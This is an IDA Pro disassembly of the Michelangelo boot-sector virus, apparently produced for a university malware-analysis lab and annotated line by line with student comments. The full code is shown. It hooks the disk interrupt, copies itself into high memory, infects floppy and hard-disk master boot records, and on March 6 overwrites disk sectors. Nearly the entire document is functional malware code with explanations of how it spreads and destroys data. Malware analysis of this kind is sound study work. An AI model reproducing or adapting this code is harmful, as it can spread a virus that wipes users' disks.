seg000:7C00 ;
seg000:7C00 ;
+-------------------------------------------------------------------------+
seg000:7C00 ; | This file was generated by The Interactive Disassembler (IDA)
|
seg000:7C00 ; | Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>
|
seg000:7C00 ; | License info: 48-BABB-7E64-E2
|
seg000:7C00 ; | Georgia Institute of Technology
|
seg000:7C00 ;
+-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 :
B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5 : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32 : 827C7725
seg000:7C00
seg000:7C00 ;
---------------------------------------------------------------------------
seg000:7C00 ; File Name : /nethome/fzhou65/lab_2/michelangelo.1
seg000:7C00 ; Format : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00 .686p
seg000:7C00 .mmx
seg000:7C00 .model flat
seg000:7C00
seg000:7C00 ;
===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000 segment byte public 'CODE' use16
seg000:7C00 assume cs:seg000
seg000:7C00 ;org 7C00h
seg000:7C00 assume es:nothing, ss:nothing, ds:nothing, fs:nothing,
gs:nothing
seg000:7C00 jmp hijack_int13_and_copy_itself ; first thing it
does is hijack int13 and copy itself
seg000:7C00 ;
---------------------------------------------------------------------------
seg000:7C03 jumpoffset db 0F5h ; DATA XREF: seg000:7CF0↓r
seg000:7C04 db 0
seg000:7C05 info dw 0 ; DATA XREF: seg000:7CD8↓w
seg000:7C07 db 2, 0Eh, 0
seg000:7C0A int13offset dw 9739h ; DATA XREF: seg000:7CC1↓w
seg000:7C0C int13segment dw 0F000h ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ;
---------------------------------------------------------------------------
seg000:7C0E
seg000:7C0E hijacked_int13: ; THIS IS THE START OF THE
HIJACKED INT13
seg000:7C0E push ds ; save ds onto stack
seg000:7C0F push ax ; save ax onto stack - we are
going to be using these registers for the hijacked int13 and are going to restore
then before returning
seg000:7C10 or dl, dl ; check if floppy A is targeted
seg000:7C12 jnz short normal_int13 ; if floppy A is NOT
targeted, do a normal int13.
seg000:7C14 xor ax, ax ; in this case floppy disk A is
targeted, ax = 0
seg000:7C16 mov ds, ax ; ds = 0
seg000:7C18 test byte ptr ds:43Fh, 1 ; check if A is running
seg000:7C1D jnz short normal_int13 ; do a normal int13 if disk
A is NOT running
seg000:7C1F pop ax ; restore ax register
seg000:7C20 pop ds ; restore ds register - we are
now going to infect the floppy in a subroutine. That subroutine will back up these
registers and more
seg000:7C21 pushf ; nothing useful
seg000:7C22 call dword ptr cs:0Ah ; calls real int13
seg000:7C27 pushf ; push flags register so that
infecting won't change flags
seg000:7C28 call infect_floppy ; infect the floppy disk
seg000:7C2B popf ; restore flags from before we
infected the floppy
seg000:7C2C retf 2 ; return from hijacked int13
seg000:7C2F ;
---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F normal_int13: ; CODE XREF: seg000:7C12↑j
seg000:7C2F ; seg000:7C1D↑j
seg000:7C2F pop ax ; restore ax
seg000:7C30 pop ds ; restore ds
seg000:7C31 jmp dword ptr cs:0Ah ; calls real int13, will
return back to the place the hijacked int13 was called
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E
=======================================
seg000:7C36
seg000:7C36
seg000:7C36 infect_floppy proc near ; CODE XREF: seg000:7C28↑p
seg000:7C36 push ax ; save ax to stack
seg000:7C37 push bx ; save bx to stack
seg000:7C38 push cx ; save cx to stack
seg000:7C39 push dx ; save dx to stack
seg000:7C3A push ds ; save ds to stack
seg000:7C3B push es ; save es to stack
seg000:7C3C push si ; save si to stack
seg000:7C3D push di ; save di to stack - now we
don't have to worry about overwrite registers
seg000:7C3E push cs ; save cs to stack so that we
can set ds = cs
seg000:7C3F pop ds ; ds = cs
seg000:7C40 push cs ; save cs to stack so that we
can set es = cs
seg000:7C41 pop es ; es = cs
seg000:7C42 mov si, 4 ; try 4 times to read floppy
seg000:7C45
seg000:7C45 copy_floppy_mbr_to_mem: ; CODE XREF: infect_floppy+29↓j
seg000:7C45 mov ax, 201h ; read one sector
seg000:7C48 mov bx, 200h ; destination of write is 512
bytes after the start of virus code
seg000:7C4B mov cx, 1 ; read track 0, sector 1
seg000:7C4E xor dx, dx ; head number 0, floppy disk A
seg000:7C50 pushf ; nothing useful
seg000:7C51 call dword ptr ds:0Ah ; calls real int13 to copy the
mbr into memory
seg000:7C55 jnb short test_infected ; if successful, continue
on. Otherwise, try again
seg000:7C57 xor ax, ax ; disk reset
seg000:7C59 pushf ; nothing useful
seg000:7C5A call dword ptr ds:0Ah ; calls real int 13 for disk
reset
seg000:7C5E dec si ; number of times remaining to
read floppy -= 1
seg000:7C5F jnz short copy_floppy_mbr_to_mem ; if there are
tries remaining, try again
seg000:7C61 jmp short finish_abnormal_int13 ; just give up if
it doesn't work in 4 tries
seg000:7C63 ;
---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 test_infected: ; CODE XREF: infect_floppy+1F↑j
seg000:7C63 xor si, si ; si = 0 (for lodsw later)
seg000:7C65 cld ; clear direction flag (string
is processed beginning from lowest to highest address)
seg000:7C66 lodsw ; Load word at address DS:SI
(DS*16+0) into AX. ax now holds the first word of the virus
seg000:7C67 cmp ax, [bx] ; compares first word of virus
with first word on floppy mbr
seg000:7C69 jnz short start_floppy_infect ; if they're not the
same, then we haven't infected it yet
seg000:7C6B lodsw ; ax holds the first word of
the virus
seg000:7C6C cmp ax, [bx+2] ; compares third word of virus
with third word on floppy mbr
seg000:7C6F jz short finish_abnormal_int13 ; if they're the
same then it's probably infected, so we just finish. otherwise, keep going and
infect
seg000:7C71
seg000:7C71 start_floppy_infect: ; CODE XREF: infect_floppy+33↑j
seg000:7C71 mov ax, 301h ; write 1 sector
seg000:7C74 mov dh, 1 ; head number 1
seg000:7C76 mov cl, 3 ; write to sector 3
seg000:7C78 cmp byte ptr [bx+15h], 0FDh ; check if the disk is
360kb
seg000:7C7C jz short floppy_infect ; if it is, backup mbr in
sector 3.
seg000:7C7E mov cl, 0Eh ; Otherwise, back up in sector
0Eh=14
seg000:7C80
seg000:7C80 floppy_infect: ; CODE XREF: infect_floppy+46↑j
seg000:7C80 mov ds:8, cx ; ds:8 has 3 or 0Eh
seg000:7C84 pushf
seg000:7C85 call dword ptr ds:0Ah ; call real int13 to write
floppy backup to sector 3
seg000:7C89 jb short finish_abnormal_int13 ; if it fails just
finish
seg000:7C8B mov si, 3BEh ; offset for real mbr partition
table and signature
seg000:7C8E mov di, 1BEh ; offset for fake mbr partition
tabe and signature
seg000:7C91 mov cx, 21h ; '!' ; size of partition table +
signature is 66 bytes (33=21h)
seg000:7C94 cld ; clear direction flag (string
is processed beginning from lowest to highest address)
seg000:7C95 rep movsw ; copies real partition table +
signature into back end of virus. Now the virus is ready to be copied into the
floppy
seg000:7C97 mov ax, 301h ; write 1 sector
seg000:7C9A xor bx, bx ; write the virus
seg000:7C9C mov cx, 1 ; write to sector 1
seg000:7C9F xor dx, dx ; drive A
seg000:7CA1 pushf ; nothing useful
seg000:7CA2 call dword ptr ds:0Ah ; call real int13 to write the
virus into sector 1 of disk A
seg000:7CA6
seg000:7CA6 finish_abnormal_int13: ; CODE XREF: infect_floppy+2B↑j
seg000:7CA6 ; infect_floppy+39↑j ...
seg000:7CA6 pop di ; pop all the registers back in
preparation for return
seg000:7CA7 pop si ; pop all the registers back in
preparation for return
seg000:7CA8 pop es ; pop all the registers back in
preparation for return
seg000:7CA9 pop ds ; pop all the registers back in
preparation for return
seg000:7CAA pop dx ; pop all the registers back in
preparation for return
seg000:7CAB pop cx ; pop all the registers back in
preparation for return
seg000:7CAC pop bx ; pop all the registers back in
preparation for return
seg000:7CAD pop ax ; pop all the registers back in
preparation for return
seg000:7CAE retn ; floppy disk infection done,
return back to hijacked int13 function
seg000:7CAE infect_floppy endp
seg000:7CAE
seg000:7CAF ;
---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF hijack_int13_and_copy_itself: ; CODE XREF: seg000:7C00↑j
seg000:7CAF xor ax, ax ; ax = 0
seg000:7CB1 mov ds, ax ; ds = 0
seg000:7CB3 cli ; clears interrupt flag
(maskable hardware interrupts will be ignored)
seg000:7CB4 mov ss, ax ; ss = 0
seg000:7CB6 mov ax, 7C00h ; ax = 7C00h
seg000:7CB9 mov sp, ax ; sp = 7C00h
seg000:7CBB sti ; enables interrupts again
seg000:7CBC push ds ; saving ds = 0 onto stack
seg000:7CBD push ax ; saving ax = 7C00h onto stack
(these are for a later return)
seg000:7CBE mov ax, ds:4Ch ; ax = offset of real int13
handler
seg000:7CC1 mov ds:int13offset, ax ; move that into 0:9739h
seg000:7CC4 mov ax, ds:4Eh ; ax = segment of real int13
handler
seg000:7CC7 mov ds:int13segment, ax ; move that into 0:F000h
seg000:7CCA mov ax, ds:413h ; ax = memory size (in kb)
seg000:7CCD dec ax ; ax = memory size (in kb) - 1
seg000:7CCE dec ax ; ax = memory size (in kb) - 2
seg000:7CCF mov ds:413h, ax ; OS now thinks memory size is
now 2 kb less
seg000:7CD2 mov cl, 6 ; preparing to left shift that
by 6 bits to get the size in bytes DIVIDED BY 16 (this is the segment for the new
virus code!)
seg000:7CD4 shl ax, cl ; ax = segment for high virus
code
seg000:7CD6 mov es, ax ; es = segment for high virus
code
seg000:7CD8 mov ds:info, ax ; 0:0 has segment for high
virus code
seg000:7CDB mov ax, 0Eh ; ax = 0Eh - this is new int13
handler offset
seg000:7CDE mov ds:4Ch, ax ; int13 handler being changed--
offset is now 000Eh
seg000:7CE1 mov word ptr ds:4Eh, es ; int13 handler being
changed--segment is now the same as for the high virus code
seg000:7CE5 mov cx, 1BEh ; 1BEh is number of words to
copy (basically the length of the virus)
seg000:7CE8 mov si, 7C00h ; si = 7C00h, offset for source
for copying
seg000:7CEB xor di, di ; di = 0, begin copying from
0:7C00h
seg000:7CED cld ; clears direction flag
seg000:7CEE rep movsb ; copies the virus into the
location 2kb from the end of memory
seg000:7CF0 jmp dword ptr cs:jumpoffset ; jumps to the "next
line" of the higher copy
seg000:7CF5 ;
---------------------------------------------------------------------------
seg000:7CF5 xor ax, ax ; ax = 0 for disk reset
seg000:7CF7 mov es, ax ; es = 0 for buffer segment
seg000:7CF9 int 13h ; infect floppy (if not already
infected)
seg000:7CFB push cs ; save cs to stack to set ds to
it
seg000:7CFC pop ds ; ds is now segment for higher
virus (ds:0 is start of virus)
seg000:7CFD mov ax, 201h ; read 1 sector
seg000:7D00 mov bx, 7C00h ; 0:7C00h is pointer to buffer
seg000:7D03 mov cx, ds:8 ; check if virus code is coming
from drive
seg000:7D07 cmp cx, 7 ; 7 means the virus is coming
form drive
seg000:7D0A jnz short boot_from_floppy ; if it's not from the
drive (it is from a floppy), then do stuff to infect the drive
seg000:7D0C mov dx, 80h ; otherwise, we know that the
drive has already been infected. Now target drive 1 to copy the real mbr into
0:7C00h
seg000:7D0F int 13h ; load backup of real drive MBR
into 0:7C00h
seg000:7D11 jmp short done_setting_up_and_infecting ; our job
here is done
seg000:7D13 ;
---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 boot_from_floppy: ; CODE XREF: seg000:7D0A↑j
seg000:7D13 mov cx, ds:8 ; load backup mbr sector
location into cx (sector we want to read from)
seg000:7D17 mov dx, 100h ; head 1, floppy A. still set
to load from 1 sector
seg000:7D1A int 13h ; load backup of real floppy
mbr into 0:7C00h
seg000:7D1C jb short done_setting_up_and_infecting ; finish if
unsuccessful
seg000:7D1E push cs ; push cs so that we can set es
= cs next
seg000:7D1F pop es ; es = segment for virus code
seg000:7D20 mov ax, 201h ; read 1 sector
seg000:7D23 mov bx, 200h ; load to 512 bytes after start
of virus code
seg000:7D26 mov cx, 1 ; track 0 sector 1
seg000:7D29 mov dx, 80h ; drive 0
seg000:7D2C int 13h ; load hd mbr into memory 512
bytes after virus code
seg000:7D2E jb short done_setting_up_and_infecting ; finish if
unsuccessful
seg000:7D30 xor si, si ; si = 0 (for lodsw later)
seg000:7D32 cld ; clear direction flag (string
is processed beginning from lowest to highest address)
seg000:7D33 lodsw ; compares first word of virus
with first word on hd mbr
seg000:7D34 cmp ax, [bx] ; if they're not the same, then
we haven't infected it yet
seg000:7D36 jnz short infect_hd ; if it's not, infect the hd
seg000:7D38 lodsw ; ax holds the first word of
the virus
seg000:7D39 cmp ax, [bx+2] ; compares third word of virus
with third word on hd mbr
seg000:7D3C jnz short infect_hd ; if they're the same then it's
probably infected, so we just finish. otherwise, keep going and infect
seg000:7D3E
seg000:7D3E done_setting_up_and_infecting: ; CODE XREF: seg000:7D11↑j
seg000:7D3E ; seg000:7D1C↑j ...
seg000:7D3E xor cx, cx ; Checks Michelangelo's
birthday using int 1Ah. Funny stuff starts happening starting from here.
seg000:7D40 mov ah, 4
seg000:7D42 int 1Ah ; CLOCK - READ DATE FROM REAL
TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42 ; Return: DL = day in BCD
seg000:7D42 ; DH = month in BCD
seg000:7D42 ; CL = year in BCD
seg000:7D42 ; CH = century (19h or 20h)
seg000:7D44 cmp dx, 306h ; Checks if it's March 6th or
not (Michelangelo's birthday)
seg000:7D48 jz short Michelangelo_StArTs_yEeTin ; michelangelo
starts yeeting if it's march 6
seg000:7D4A retf ; if not, return to 0:7C00h
(give control back to normal mbr)
seg000:7D4B ;
---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B Michelangelo_StArTs_yEeTin: ; CODE XREF: seg000:7D48↑j
seg000:7D4B xor dx, dx ; head number 0, drive number 0
(first floppy)
seg000:7D4D mov cx, 1 ; track sector 1
seg000:7D50
seg000:7D50 where_virus_isLoadedFrom: ; CODE XREF: seg000:7D7F↓j
seg000:7D50 ; seg000:7D85↓j
seg000:7D50 mov ax, 309h ; write 9 sectors if loaded
from floppy disk
seg000:7D53 mov si, ds:8 ; si = 3 if from floppy disk, 7
if from hd, 0Eh otherwise
seg000:7D57 cmp si, 3 ; check if loaded from floppy
disk
seg000:7D5A jz short i_am_inevitable ; if so, yeet the floppy
seg000:7D5C mov al, 0Eh ; write 14 sectors
seg000:7D5E cmp si, 0Eh ; if virus not loaded from hd
seg000:7D61 jz short i_am_inevitable ; start overwriting if
virus not loaded from hd or floppy (writing 15 sectors)
seg000:7D63 mov dl, 80h ; write to hd
seg000:7D65 mov byte ptr ds:7, 4 ; max heads is now 4 if we're
yeeting a hd, otherwise it's 2
seg000:7D6A mov al, 11h ; if it's from a hd, write 11h
sectors (17 sectors). now yeet the hd
seg000:7D6C
seg000:7D6C i_am_inevitable: ; CODE XREF: seg000:7D5A↑j
seg000:7D6C ; seg000:7D61↑j
seg000:7D6C mov bx, 5000h ; Puts disk location 5000h onto
bx register. (DOUBLE CHECK LATER)
seg000:7D6F mov es, bx ; 5000h:5000h is address of
user buffer. This has random useless information
seg000:7D71 assume es:nothing
seg000:7D71 int 13h ; overwrite disk at
track/cylinder number 1, sector number 1
seg000:7D73 jnb short step_head_and_track ; If errors out on
sector/denial skip on to next one
seg000:7D75 xor ah, ah ; ah = 0 (reset disk system)
seg000:7D77 int 13h ; DISK - RESET DISK SYSTEM
seg000:7D77 ; DL = drive (if bit 7 is set
both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 step_head_and_track: ; CODE XREF: seg000:7D73↑j
seg000:7D79 inc dh ; head number ++
seg000:7D7B cmp dh, ds:7 ; checks if head number is 4
seg000:7D7F jb short where_virus_isLoadedFrom ; yeet the next
head if head number is < 4
seg000:7D81 xor dh, dh ; otherwise, head number = 0
seg000:7D83 inc ch ; and increment the track
number
seg000:7D85 jmp short where_virus_isLoadedFrom ; now yeet this
track
seg000:7D87 ;
---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 infect_hd: ; CODE XREF: seg000:7D36↑j
seg000:7D87 ; seg000:7D3C↑j
seg000:7D87 mov cx, 7 ; the sector to back up the mbr
is 7
seg000:7D8A mov ds:8, cx ; also put 7 in the beginning
of virus code
seg000:7D8E mov ax, 301h ; write 1 sector
seg000:7D91 mov dx, 80h ; target disk 0
seg000:7D94 int 13h ; write real mbr into sector 7
of hd
seg000:7D96 jb short done_setting_up_and_infecting ; finish if
unsuccessful
seg000:7D98 mov si, 3BEh ; offset for real mbr partition
table + signature
seg000:7D9B mov di, 1BEh ; offset for fake mbr partition
table and signature (after virus)
seg000:7D9E mov cx, 21h ; '!' ; size of partition table +
signature is 33 words (33=21h)
seg000:7DA1 rep movsw ; copies real parition table +
signature into back end of virus. Now virus is ready to be spread
seg000:7DA3 mov ax, 301h ; we gonna write 1 sector
seg000:7DA6 xor bx, bx ; we gonna write the virus
(es:0 is where the virus is)
seg000:7DA8 inc cl ; cl = 1 (sector 1)
seg000:7DAA int 13h ; copy virus to sector 1 of hd
seg000:7DAC jmp short done_setting_up_and_infecting ; we done
infecting bois
seg000:7DAC ;
---------------------------------------------------------------------------
seg000:7DAE db 50h dup(0), 55h, 0AAh
seg000:7DAE seg000 ends
seg000:7DAE
seg000:7DAE

seg000:7DAE end